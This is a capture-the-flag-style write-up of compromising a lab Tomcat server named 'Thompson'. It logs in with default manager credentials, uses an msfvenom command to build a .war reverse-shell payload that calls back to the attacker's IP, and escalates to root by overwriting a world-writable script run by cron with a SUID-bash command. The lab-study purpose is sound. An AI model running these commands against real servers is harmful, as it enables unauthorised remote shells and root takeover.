# Thompson
**Author:** Garrett Segura (@grehaus)

**Date:** 2026/03/08

**Summary**: An Apache Tomcat server is using default credentials which allows an attacker to access the management page. From there, the attacker is able to upload a malicious .war file and execute a reverse shell back to the attackers box. Further enumeration leads to finding a cronjob being run as root on a world writeable file that is abused to escalate privileges.

---

<br>

## Table of Contents
1. Recon
2. Enumeration
3. Initial Access
4. Privilege Escalation
5. Mitigations and Recommendations


---

<br>

## 1. Recon

| Port | Version |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 8009/tcp | Apache Jserv (Protocol v1.3) |
| 8080/tcp | Apache Tomcat 8.5.5 |

+ Initial Port Scan

<br>
<br>

---

## 2. Enumeration
<img width="2557" height="1129" alt="image" src="https://github.com/user-attachments/assets/fdacb1c5-ac80-4b82-a583-5972a4780b7e" />

+ The default credentials for Apache Tomcat `tomcat:s3cret` grant the attacker access to the `/manager` endpoint.

<br>
<br>

<img width="1400" height="65" alt="image" src="https://github.com/user-attachments/assets/a187517a-7804-495d-9962-9182c4acdac7" />

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.152.252 LPORT=9001 -f war > reverse.war`

+ The attacker used the following command to build a .war file that will send a reverse connection back to the attacker machine.


<br>
<br>

<img width="2540" height="493" alt="image" src="https://github.com/user-attachments/assets/48208138-c1df-4ce7-b188-64a514ca22d1" />

+ This file is then uploaded via the `/manager` endpoint. This will create the `/reverse` endpoint that houses the payload, which upon execution, prompts the webserver to send a connection out to the attacker.

<br>
<br>

---

## 3. Initial Accesss
<img width="686" height="134" alt="image" src="https://github.com/user-attachments/assets/e262cf05-5374-4c0b-8e86-c94276c191f0" />

+ The previous .war file was executed and the attacker reveived a reverse shell as the `www-data` user.

<br>
<br>

<img width="803" height="361" alt="image" src="https://github.com/user-attachments/assets/519daeb6-6270-4c48-aa87-21555a0ac2d5" />

+ A Python webserver is started on the attackers machine that holds the `linpeas.sh` script that the attacker is able to download to the victim machine.

<br>
<br>

---

## 4. Privilege Escalation
<img width="937" height="107" alt="image" src="https://github.com/user-attachments/assets/c661ecbd-9aa1-410e-9e76-4c6aed6471f2" />

+ The attacker finds a cronjob running as the `root` user executing every minute.

<br>
<br>

<img width="911" height="315" alt="image" src="https://github.com/user-attachments/assets/f9e13776-b280-4167-b4c3-a9e8b43dda31" />
<img width="509" height="83" alt="image" src="https://github.com/user-attachments/assets/bd5ab778-9857-495f-9d83-73093f4cafe6" />

<br>
<br>

+ Further enumeration identifies the `/home/jack/id.sh` file is world writable, and validated by manually checking the file permissions as seen in the two images above.

<br>
<br>

<img width="1198" height="442" alt="image" src="https://github.com/user-attachments/assets/b0f91dd7-82bc-4fda-98b4-3ab1337bcca3" />

The attacker uses the following command to copy the `/bin/bash` binary to `/tmp/rootbash` - 

`echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash' > /home/jack/id.sh`

+ After the root cronjob has ran, the `/tmp/rootbash` binary is created with SUID permissions and the attacker is able to execute via `./rootbash -p` to spawn a root shell.

<br>
<br>

---

## 5. Mitigations and Recommendations
+ Change default credentials to a secure unique passphrase.
+ Identify and mitigate suspicious outgoing connections from running services.
+ Remove world write privileges to critical/root operated files.

<br>

---
